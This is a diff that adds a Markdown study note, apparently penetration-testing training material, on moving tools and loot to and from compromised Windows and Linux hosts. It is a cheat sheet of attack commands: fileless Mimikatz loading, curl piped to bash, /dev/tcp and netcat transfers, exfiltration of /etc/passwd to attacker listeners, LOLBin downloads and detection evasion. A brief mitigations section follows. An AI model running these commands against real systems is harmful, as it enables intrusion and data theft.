@@ -1,0 +1,110 @@
+# File Transfers
+
+## 🎯 Main Idea
+- Techniques to move files (tools, scripts, payloads, loot) **to and from** compromised Windows and Linux hosts during an engagement.
+- Covers download and upload operations over many protocols, encoding/encryption of transfers, catching files over HTTP/S, "living off the land" with built-in binaries, and how transfers are detected/evaded.
+
+## 💥 Attack / Exploit Vectors
+### Windows PowerShell Web Downloads/Uploads
+- Native PowerShell methods to pull or push files over HTTP/S, including fileless (in-memory) execution.
+- **Commands**
+  - `(New-Object Net.WebClient).DownloadFile('<url>','<outfile>')` — download a file to disk
+  - `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')` — execute a script in memory (fileless)
+  - `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1` — download via IWR (use `-UseBasicParsing` to avoid IE-engine errors)
+  - `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64` — upload a base64 blob via POST
+
+### SMB Downloads (Windows)
+- Host files on an attacker SMB share and copy them to the target (optionally with auth to bypass restrictions on guest/unauthenticated SMB).
+- **Commands**
+  - `impacket-smbserver share ./ -smb2support` — stand up an SMB server (add `-user`/`-pass` for authenticated share)
+  - `copy \\<attacker-ip>\share\file.exe` — copy file from the SMB share to target
+
+### FTP Transfers
+- Spin up an FTP server on the attack host and fetch with PowerShell/clients.
+- **Commands**
+  - `sudo python3 -m pyftpdlib --port 21` — quick FTP server (pyftpdlib)
+  - `(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt','C:\Users\Public\ftp-file.txt')` — download over FTP
+
+### Linux Web Downloads (wget/cURL) & Fileless
+- Pull files or pipe scripts straight to an interpreter without touching disk.
+- **Commands**
+  - `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh` — download with wget
+  - `curl -o /tmp/LinEnum.sh https://.../LinEnum.sh` — download with cURL
+  - `curl https://.../LinEnum.sh | bash` — fileless: pipe directly to bash
+  - `wget -qO- https://.../helloworld.py | python3` — fileless: pipe to python3
+
+### Bash /dev/tcp (no external tools)
+- Use the shell's built-in TCP socket to download when wget/curl are unavailable.
+- **Commands**
+  - `exec 3<>/dev/tcp/10.10.10.32/80` — open a TCP socket on fd 3
+  - `cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe` — receive a file via /dev/tcp
+
+### Transferring Files with Code
+- Use installed languages as download/upload clients when dedicated tools are missing.
+- **Commands**
+  - `php -r '$file=file_get_contents("https://<snip>/LinEnum.sh");file_put_contents("LinEnum.sh",$file);'` — download via PHP
+  - `python3 -c '...urllib...'` / Ruby / Perl one-liners — download via interpreters
+  - `python3 -m uploadserver` — run an upload-capable HTTP server on attack host
+  - `curl -X POST http://<ip>:8000/upload -F 'files=@/etc/passwd'` — upload via POST
+
+### SCP / SSH Transfers
+- Authenticated, encrypted copy both directions.
+- **Commands**
+  - `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip` — upload via SCP
+  - `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe` — download via SCP
+
+### Netcat / Ncat Transfers
+- Transfer raw files over arbitrary ports (listener on one side, sender on the other).
+- **Commands**
+  - `nc -l -p 8000 > SharpKatz.exe` — listener receiving a file
+  - `nc -w 5 192.168.49.128 8000 < SharpKatz.exe` — send a file to the listener
+  - `ncat 192.168.49.128 443 --recv-only > SharpKatz.exe` — ncat receive-only download
+
+### PowerShell Remoting (WinRM)
+- Copy files between hosts over an established PS session (TCP 5985).
+- **Commands**
+  - `$Session = New-PSSession -ComputerName DATABASE01` — open a remoting session
+  - `Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\...\` — push a file over the session
+  - `Copy-Item -Path "C:\...\DATABASE.txt" -Destination C:\ -FromSession $Session` — pull a file from the session
+
+### Protected / Encrypted Transfers
+- Encrypt files before transfer to protect loot and evade content inspection.
+- **Commands**
+  - `openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc` — AES-encrypt on Linux
+  - `openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd` — decrypt
+  - `Invoke-AESEncryption.ps1` — PowerShell AES encrypt/decrypt module (Windows)
+
+### Catching Files over HTTP/S
+- Receive uploaded files on an HTTPS listener or an Nginx server with PUT enabled.
+- **Commands**
+  - `openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'` — generate a self-signed cert
+  - `python3 -m uploadserver` (HTTPS) / Nginx `dav_methods PUT` config — accept uploads
+  - `curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt` — upload with PUT
+  - `curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' --insecure` — upload over HTTPS
+
+### Living off the Land (LOLBAS / GTFOBins)
+- Abuse trusted, signed OS binaries for transfers to blend in and evade detection.
+- **Commands**
+  - `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe` — download via Bitsadmin
+  - `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe` — download via Certutil
+  - GTFOBins / LOLBAS projects — look up transfer-capable native binaries
+
+### Evading Detection
+- Alter request fingerprints and use uncommon LOLBins to dodge signatures/IDS.
+- **Commands**
+  - `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` — spoof a Chrome User-Agent
+  - `GfxDownloadWrapper.exe "<url>" "<outfile>"` — download via an uncommon signed binary
+
+## 🛠️ Key Tools & Concepts
+- PowerShell: `Net.WebClient`, `Invoke-WebRequest`/`IEX`, PS Remoting `Copy-Item`
+- `impacket-smbserver`, SMB shares (auth vs guest)
+- `python3 -m http.server` / `uploadserver`, `pyftpdlib`
+- `wget`, `curl`, Bash `/dev/tcp`, interpreter one-liners (PHP/Python/Ruby/Perl/VBScript/JS)
+- `scp`/SSH, `nc`/`ncat`, `openssl` (s_server/s_client, enc), Nginx PUT/WebDAV
+- LOLBAS / GTFOBins: `bitsadmin`, `certutil`, `GfxDownloadWrapper.exe`
+- base64 encode/decode + `md5sum` integrity verification
+
+## 🛡️ Mitigations
+- Monitor/detect transfer signatures: `Invoke-WebRequest`, `WinHttpRequest`, `Msxml2`, `certutil`, `BITS` client/server events.
+- Restrict/alert on use of LOLBins (bitsadmin, certutil) and unusual outbound connections.
+- Enforce egress firewall rules and application allow-listing to block unauthorized transfers.
